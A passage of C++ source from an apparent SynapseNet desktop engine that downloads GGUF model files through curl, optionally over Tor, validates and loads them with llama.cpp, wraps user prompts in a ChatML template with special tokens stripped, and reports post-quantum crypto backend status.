    out["running"] = snap.running;
    out["done"] = snap.done;
    out["failed"] = snap.failed;
    out["error"] = snap.error;
    out["via"] = snap.viaTor ? "tor" : "direct";
    return out.dump();
}

std::string SynapsedEngine::modelDownloadCancel() {
    modelDlStop_.store(true);
    long pid = modelDlPid_.load();
#ifndef _WIN32
    if (pid > 1) {
        kill(static_cast<pid_t>(pid), SIGTERM);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
        kill(static_cast<pid_t>(pid), SIGKILL);
    }
#endif
    {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        if (modelDl_.running) {
            modelDl_.running = false;
            modelDl_.failed = true;
            modelDl_.error = "cancelled";
        }
    }
    return "{\"ok\":true}";
}

void SynapsedEngine::modelDownloadLoop(std::string id, std::string url, std::string dest,
                                       uint64_t expected, bool viaTor) {
#ifndef _WIN32
    std::string partial = dest + ".partial";
    std::vector<std::string> args = {
        "curl", "-L", "--fail", "-C", "-",
        "--retry", "5", "--retry-delay", "3",
        "--connect-timeout", "30",
        "-A", "SynapseNet/0.1",
        "-o", partial
    };
    if (viaTor) {
        int sp = sessionSocksPort_ > 0 ? static_cast<int>(sessionSocksPort_) : gSocksPort.load();
        args.push_back("--socks5-hostname");
        args.push_back("127.0.0.1:" + std::to_string(sp));
    }
    args.push_back(url);

    std::vector<char*> argv;
    argv.reserve(args.size() + 1);
    for (auto& a : args) argv.push_back(a.data());
    argv.push_back(nullptr);

    pid_t pid = fork();
    if (pid < 0) {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        modelDl_.running = false;
        modelDl_.failed = true;
        modelDl_.error = "fork failed";
        return;
    }
    if (pid == 0) {
        int nullfd = open("/dev/null", O_RDWR);
        if (nullfd >= 0) {
            dup2(nullfd, STDIN_FILENO);
            dup2(nullfd, STDOUT_FILENO);
            dup2(nullfd, STDERR_FILENO);
            if (nullfd > 2) close(nullfd);
        }
        execvp("curl", argv.data());
        _exit(127);
    }
    modelDlPid_.store(pid);
    int st = 0;
    waitpid(pid, &st, 0);
    modelDlPid_.store(-1);

    if (modelDlStop_.load()) {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        modelDl_.running = false;
        modelDl_.failed = true;
        modelDl_.done = false;
        modelDl_.error = "cancelled";
        return;
    }

    bool curlOk = WIFEXITED(st) && WEXITSTATUS(st) == 0;
    if (!curlOk) {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        modelDl_.running = false;
        modelDl_.failed = true;
        modelDl_.error = "curl exit " + std::to_string(WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        return;
    }

    std::error_code ec;
    std::filesystem::rename(partial, dest, ec);
    if (ec) {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        modelDl_.running = false;
        modelDl_.failed = true;
        modelDl_.error = "rename failed";
        return;
    }
    if (!validateGguf(dest)) {
        std::filesystem::remove(dest, ec);
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        modelDl_.running = false;
        modelDl_.failed = true;
        modelDl_.error = "downloaded file is not GGUF";
        return;
    }

    nlohmann::json loadParams;
    loadParams["path"] = dest;
    (void)modelLoad(loadParams.dump());
    {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        modelDl_.bytes = fileSizeOr0(dest);
        modelDl_.total = expected ? expected : modelDl_.bytes;
        modelDl_.running = false;
        modelDl_.done = true;
        modelDl_.failed = false;
        modelDl_.error.clear();
        modelDl_.id = id;
        modelDl_.path = dest;
    }
#else
    (void)id; (void)url; (void)dest; (void)expected; (void)viaTor;
    std::lock_guard<std::mutex> dl(modelDlMtx_);
    modelDl_.running = false;
    modelDl_.failed = true;
    modelDl_.error = "download not implemented on windows";
#endif
}

bool SynapsedEngine::ensureLlamaLoaded() const {
    std::string path;
    {
        std::lock_guard<std::mutex> lock(mtx_);
        path = modelPath_;
        if (inferenceReady_ && llamaEngine_ && llamaEngine_->isModelLoaded("desktop"))
            return true;
    }
    if (path.empty() || !validateGguf(path)) return false;

    int nGpuLayers = 0;
    {
        std::ifstream sf(dataDir_ + "/settings.json");
        if (sf.good()) {
            std::string content((std::istreambuf_iterator<char>(sf)),
                                 std::istreambuf_iterator<char>());
            nlohmann::json j = nlohmann::json::parse(content, nullptr, false);
            if (!j.is_discarded() && j.is_object()) {
                bool gpuOn = false;
                if (j.contains("gpu_enabled")) {
                    if (j["gpu_enabled"].is_boolean()) gpuOn = j["gpu_enabled"].get<bool>();
                    else if (j["gpu_enabled"].is_number()) gpuOn = j["gpu_enabled"].get<int>() != 0;
                }
                if (gpuOn) {
                    nGpuLayers = 32;
                    if (j.contains("gpu_layers") && j["gpu_layers"].is_number())
                        nGpuLayers = std::max(0, j["gpu_layers"].get<int>());
                }
            }
        }
    }

    std::lock_guard<std::mutex> llama(llamaMtx_);
    try {
        if (!llamaEngine_) {
            llamaEngine_ = std::make_unique<synapse::model::InferenceEngine>();
            llamaEngine_->initialize(1);
            llamaEngine_->setDefaultTimeout(120000);
        } else if (llamaEngine_->isModelLoaded("desktop")) {
            llamaEngine_->unloadModel("desktop");
        }
        if (!llamaEngine_->loadModel("desktop", path, nGpuLayers)) {
            inferenceReady_ = false;
            return false;
        }
        inferenceReady_ = true;
        return true;
    } catch (...) {
        inferenceReady_ = false;
        return false;
    }
}

// Qwen2.5 Instruct needs ChatML. Raw "hi" continues coding dumps from the corpus.
static std::string eraseNeedle(std::string s, const char* needle) {
    const size_t n = std::strlen(needle);
    for (;;) {
        const size_t p = s.find(needle);
        if (p == std::string::npos) break;
        s.erase(p, n);
    }
    return s;
}

static std::string wrapDesktopChat(std::string user) {
    user = eraseNeedle(std::move(user), "<|im_start|>");
    user = eraseNeedle(std::move(user), "<|im_end|>");
    user = eraseNeedle(std::move(user), "<|endoftext|>");
    std::string out;
    out.reserve(user.size() + 220);
    out += "<|im_start|>system\n";
    out += "You are a helpful assistant for SynapseNet. Answer the user directly and briefly.\n";
    out += "<|im_end|>\n";
    out += "<|im_start|>user\n";
    out += user;
    out += "\n<|im_end|>\n";
    out += "<|im_start|>assistant\n";
    return out;
}

static std::string stripAssistantSpecial(std::string text) {
    const char* stops[] = {"<|im_end|>", "<|im_start|>", "<|endoftext|>"};
    for (const char* s : stops) {
        const size_t p = text.find(s);
        if (p != std::string::npos) text.resize(p);
    }
    while (!text.empty() && (text.back() == '\n' || text.back() == '\r' || text.back() == ' '))
        text.pop_back();
    while (!text.empty() && (text.front() == '\n' || text.front() == '\r' || text.front() == ' '))
        text.erase(text.begin());
    return text;
}

std::string SynapsedEngine::aiCompleteRpc(const std::string& paramsJson) {
    nlohmann::json p = nlohmann::json::parse(paramsJson, nullptr, false);
    std::string prompt;
    if (!p.is_discarded() && p.is_object() && p.contains("prompt") && p["prompt"].is_string()) {
        prompt = p["prompt"].get<std::string>();
    }
    if (prompt.empty()) return "{\"error\":\"missing prompt\"}";
    if (modelPath_.empty() && !modelLoaded_) return "{\"error\":\"no model loaded\"}";
    if (!ensureLlamaLoaded()) {
        return "{\"error\":\"GGUF is registered but llama.cpp could not load it into RAM\"}";
    }
    const std::string chatPrompt = wrapDesktopChat(prompt);
    std::map<std::string, float> params;
    params["max_tokens"] = 256.f;
    params["temperature"] = 0.7f;
    std::string text;
    {
        std::lock_guard<std::mutex> llama(llamaMtx_);
        if (llamaEngine_) text = llamaEngine_->runSyncText("desktop", chatPrompt, params);
    }
    text = stripAssistantSpecial(std::move(text));
    if (text.empty()) return "{\"error\":\"empty model output (timeout or load failure)\"}";
    nlohmann::json out;
    out["text"] = text;
    return out.dump();
}

std::string SynapsedEngine::cryptoStatusJson() const {
    auto pqc = synapse::quantum::getPQCBackendStatus();
    nlohmann::json j;
    j["kem"] = "ML-KEM-768 / Kyber768";
    j["sig"] = "ML-DSA-65 / Dilithium3";
    j["hash_sig"] = "SLH-DSA-SHA2-128s / SPHINCS+";
    j["kyber_real"] = pqc.kyberReal;
    j["dilithium_real"] = pqc.dilithiumReal;
    j["sphincs_real"] = pqc.sphincsReal;
    j["backend"] = (pqc.kyberReal && pqc.dilithiumReal && pqc.sphincsReal) ? "liboqs" : "simulation";
    j["handshake"] = "ML-KEM-768";
    j["msg"] = pqc.kyberReal
                   ? "hybrid Kyber+X25519 NODE_MSG over Tor"
                   : "X25519 crypto_box_seal over Tor (not PQC)";
    j["symmetric"] = "AES-256-GCM";
    j["hash"] = "SHA3-512";
    return j.dump();
}

}
}
